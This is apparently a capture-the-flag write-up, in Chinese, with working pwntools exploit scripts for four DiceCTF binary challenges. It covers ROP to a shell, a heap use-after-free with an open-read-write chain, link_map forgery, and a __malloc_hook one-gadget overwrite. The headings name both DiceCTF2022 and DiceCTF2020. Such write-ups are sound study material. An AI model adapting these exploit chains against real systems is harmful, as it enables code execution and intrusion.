# DiceCTF2022


# DiceCTF2020

DiceCTF题目好怪啊

## interview

在主函数有一个溢出，覆盖main的返回地址为`_libc_strat_main`内，可以再次调用main同时得到libc地址。

```python
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './interview-opportunity'
libc = './libc.so.6'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary
context.log_level='debug'
# p = process(binary)
p = remote('mc.ax', 31081)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

# gdb.attach(p, "b *0x401276")
payload = "A"*0x1a + "B"*0x8 + "\x03"
p.sendafter("DiceGang?\n", payload)

p.recvuntil("B"*0x8)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x26d03
leak("libc base", libcbase)

pop_rdi = libcbase + 0x0000000000026796
binsh = libcbase + 0x000000000018a152
system = libcbase + libc.sym['system']

payload = "A"*0x1a + "B"*0x8 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter("DiceGang?\n", payload)

p.interactive()

```

## baby-rop

uaf，通过对ub中的chunk的复用泄漏libc地址，uaf控制一个strings的结构体，从而可以任意地址读写，泄露栈地址，向栈中写rop

```python
from multiprocessing.dummy import Value
from os import environ
from webbrowser import get
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './babyrop'
libc = './libc.so-2.6'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary
context.log_level='debug'
# p = process(binary)
p = remote('mc.ax', 31245)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

def add(idx, size, data):
    p.sendlineafter("command: ","C")
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("string: ", str(size))
    p.sendafter(" string: ", data)
def free(idx):
    p.sendlineafter("command: ","F")        
    p.sendlineafter("index: ", str(idx))
def show(idx):
    p.sendlineafter("command: ","R")        
    p.sendlineafter("index: ", str(idx))
def edit(idx, data):   
    p.sendlineafter("command: ","W")        
    p.sendlineafter("index: ", str(idx))     
    p.sendlineafter(" string: ", data)
def get_leak(size): 
    p.recvuntil("bytes\n ")
    buf = p.recvuntil("\n", drop=True).split(" ")
    value = 0
    for i in range(size):
        value += (int(buf[i], 16)<<(8*i))
    return value
    # print("value = " + hex(value))
        
add(0, 0x500, "a"*0x18)
add(1, 0x500, "a"*0x18)
add(2, 0x500, "a"*0x18)
free(0)
free(1)
add(0, 0x500, 'A')
add(1, 0x500, 'A')
show(0)
p.recvuntil("bytes\n ")
p.recvuntil("00 00 ")
buf = p.recvuntil("\n", drop=True).split(" ")
heapbase = 0
for i in range(8):
    heapbase += (int(buf[i], 16)<<(8*i))
heapbase = heapbase - 0x1c00
leak("heapbase", heapbase)
# pause()
show(1)
p.recvuntil("bytes\n ")
buf = p.recvuntil("\n", drop=True).split(" ")
libcbase = 0
for i in range(8):
    libcbase += (int(buf[i], 16)<<(8*i))
libcbase = libcbase - 0x1f4c41
leak("libc base", libcbase)

open_addr = libcbase + libc.sym['open']
read_addr = libcbase + libc.sym['read']
write_addr = libcbase + libc.sym['write']
environ = libcbase + libc.sym['environ']
pop_rdi = libcbase + 0x000000000002d7dd
pop_rsi = libcbase + 0x000000000002eef9
pop_rdx = libcbase + 0x00000000000d9c2d

add(0, 0x18, "0"*0x18)
add(1, 0x28, "1"*0x18)
free(0)
free(1)
add(2, 0x18, p64(0x100)+p64(environ))
show(0)
stack_leak = get_leak(8) - 0x140
leak("stack leak", stack_leak)
edit(2,p64(0x100)+p64(stack_leak))

flag_str = stack_leak + 0x8*(19+8)
orw = p64(pop_rdi+1)*8
# open 
orw += p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(open_addr)
# read 
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(read_addr)
# write 
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(write_addr)
orw += "./flag.txt\x00"

edit(0, orw)
p.sendlineafter("command: ","E")        

p.interactive()

```

## dataeater

可以控制scanf的参数，不能rop。这样可以写任意写buf和link_map。覆盖link_map->l_info[strtab]为buf，从而在buf伪造system字符串，使其搜索system地址。

```python
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './dataeater'
libc = "/lib/x86_64-linux-gnu/libc.so.6"
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary
context.log_level='debug'
# p = process(binary)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

st_name = 0x37
system_str = elf.sym['buf'] + 0x10
def pwn(k):
  print(k)
  try:
    r = remote('mc.ax', 31869)
    # r = process(binary)
    # gdb.attach(r)
    r.sendline('%s%{}$s'.format(k))
    # r.sendline("a a")
    r.sendline(b'/bin/sh\0' + p64(system_str - st_name) + b'system\0 ' + p64(0)*13 + p64(elf.sym['buf'])[:-1])

    r.interactive()
    return True
  except EOFError:
    return False
  finally:
    r.close()

pwn(32)

```

## chutes-ladders

- First, copy all the Player->mark to the first board->players

Game：
- spin a num （0-6）， 0 pass
- `cur_player->square`
- update board
  - `board->bitmap ^= (1 << palyer_idx)`
  - leave here
    - clear `board->players`
    - if `bitmap == 0`:
      - free `board->players`
- `Player->square += spin`
- if hit a ladders:
  - `cur_player->square = ladders_end`
  - update board
    - `board->bitmap ^= (1 << palyer_idx)`
    - enter here
      - first get the board:
        - allocte `board->players`, init with ' '
      - copy mark
  - `ladders_hit = 1`
- if hit a chutes:
  - `cur_player->square = chutes_end`
  - update board
    - `board->bitmap ^= (1 << palyer_idx)`
    - enter here
      - first get the board:
        - allocte `board->players`, init with ' '
      - copy mark
  - `chutes_hit = 1`
- else 
  - update board
    - `board->bitmap ^= (1 << palyer_idx)`
    - enter here
      - first get the board:
        - allocte `board->players`, init with ' '
      - copy mark
  - `chutes_hit = 1`
- if `bitmap == 0`:
  - `board->players = 0`
- next turn
- repeat

10 players

- [0, 1, 2, 3, 4, 5, 6, 7, 8] at 1 
  - allocate one chunk
- [3, 4, 5, 6, 7, 8] at 1, [0, 1, 2] at 2
  - allocate two chunk
- [3, 4, 5, 6, 7, 8] at 1, [1, 2] at 2,  0 at 5
  - allocate three chunk
- [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] at 5
  - allocate two chunk
  - free 1
- [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] leave but ret to 5
  - allocate one chunk
  - free 3 (UAF) -> free 1
- [8, 9] at 2, [0, 1, 2, 3, 4, 5, 6, 7] at 5
  - allocate one chunk
  - free 3 (UAF) -> __malloc_hook
- [8, 9] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6
  - __malloc_hook 
- [8] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6, [0] at 10
  - 10 is __malloc_hook - 4
- [1, 2, 3, 8] at 5, [0, 4, 5, 6, 7, 9] at 10
  - overwrite malloc_hook to one gadget
- [1, 2, 3] at 5, [0, 4, 5, 6, 7, 8, 9] at 10
  - overwrite malloc_hook to one gadget
- [1, 2, 3] at 5, [4, 5, 6, 7, 8, 9] at 10, [0] at 14 hit chutes to 0! 
  - clear rdx=0, trigger one gadget 

```python
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './chutes'
libc = './libc.so-3.6'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary
context.log_level='debug'
# p = process(binary)
p = remote("mc.ax",31326)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

def change_maps():
    p.sendlineafter("(y/n): ", "y")

    p.sendlineafter(": ", "10 4") # to uaf
    p.sendlineafter(": ", "14 0") # to clear rdx
    p.sendlineafter(": ", "30 21")
    p.sendlineafter(": ", "40 31")
    p.sendlineafter(": ", "50 41")

    p.sendlineafter(": ", "6 99") # to leak
    p.sendlineafter(": ", "33 97")
    p.sendlineafter(": ", "48 62")
    p.sendlineafter(": ", "68 72")
    p.sendlineafter(": ", "78 93")    

def turn(spin, mark=None, see='n'): 
    if mark != None:
        p.sendlineafter(": ", "y")
        p.sendlineafter(": ", mark)
    else:
        p.sendlineafter(": ", "n")        
    p.sendlineafter("): ", str(spin))
    p.sendlineafter("): ", see)    

p.sendlineafter("10): ", "10")
for i in range(10):
    p.sendlineafter(": ", str(i))

change_maps()
# turn(6)
p.sendlineafter(": ", "n")
p.sendlineafter("): ", str(6))
p.recvline()
p.recvuntil("prize: 0x")

one  = [0xe6c7e, 0xe6c81, 0xe6c84]
libc_base = int(p.recvuntil("\n", drop=True), 16) - libc.sym["puts"]
malloc_hook = libc_base + libc.sym["__malloc_hook"] - 4
og = libc_base + one[1]
leak("libc_base",libc_base)
leak("malloc_hook", malloc_hook)
p.sendlineafter("): ", "n")   

turn(1) # 1
turn(1) # 2
for i in range(10-3):
    turn(0) # 3 4 5 6 7 8 9
    
turn(4) # 0
turn(0) # 1
turn(0) # 2
for i in range(10-3):
    turn(1) # 3 4 5 6 7 8 9
    
turn(6, p64(malloc_hook)[0]) # 0
for i in range(1, 8):
    turn(3, p64(malloc_hook)[i]) # 1 2 3 4 5 6 7 
turn(0) # 8
turn(4) # 9

turn(5, '\xaa') # 0
turn(0, '\xbb') # 1 
turn(0, '\xcc') # 2 
turn(0, '\xdd') # 3

for i in [4, 5, 6, 7]:
    turn(5, p64(og)[i-4])

turn(3, p64(og)[4]) # 8 --> [5]
turn(4, p64(og)[5]) # 9 --> [10]

for i in range(8): 
    turn(0)

turn(5) # 8
turn(0) # 9

p.sendlineafter(": ", "n")
p.sendlineafter("): ", str(5)) 

p.interactive()

```

